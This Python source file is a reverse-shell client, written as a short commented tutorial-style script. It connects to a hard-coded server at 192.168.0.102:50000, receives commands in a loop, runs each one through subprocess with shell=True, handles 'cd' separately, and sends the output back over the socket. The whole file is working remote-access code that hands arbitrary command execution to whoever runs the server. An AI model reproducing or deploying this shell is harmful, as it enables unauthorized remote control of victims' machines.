 ##########################################################
 #                Functions of the Client                 #
 # Try To connect to the server.                          #
 # Wait For instructions.                                 #
 # Receives instructions and run them.                    #
 # Take the result and send them back to the server.      #
 #                                                        #
 ##########################################################

import socket
import os
import subprocess


# Create a socket
s = socket.socket()
host = '192.168.0.102'
port = 50000

# connect to the server

s.connect((host,port))



# Receive Instructions
while True:

     # Check the received data to determine actions will be done
     data = s.recv(1024)  # 1024 Buffer Size
     decoded_data = data.decode("utf-8")
     if decoded_data[:2] == 'cd':  # Handle 'cd' command
         path = decoded_data[3:].strip()  # Extract the directory path
         if os.path.exists(path):  # Check if the path exists
             os.chdir(path)  # Change the current working directory
             s.send(str.encode(f"Changed directory to {os.getcwd()}\n"))
         else:
             s.send(str.encode(f"Error: Directory '{path}' does not exist.\n"))
     elif len(data) > 0:
         # subprocess.open helps to run the entered command as if you are in a real terminal
         cmd = subprocess.Popen(data[:].decode("utf-8"),  # convert received data from Bytes to string
                                shell=True,  # To execute commands in a shell
                                stdout=subprocess.PIPE,  # To store the output of any entered command in that pipe
                                stdin=subprocess.PIPE,  # To store the inputs of any entered command in that pipe
                                stderr=subprocess.PIPE  # To store Error messages generated in that pipe.
                                )
         # we have to send output to the server
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte, "utf-8")
         s.send(str.encode(output_str))
         print(output_str)  # to print result on the server's computer




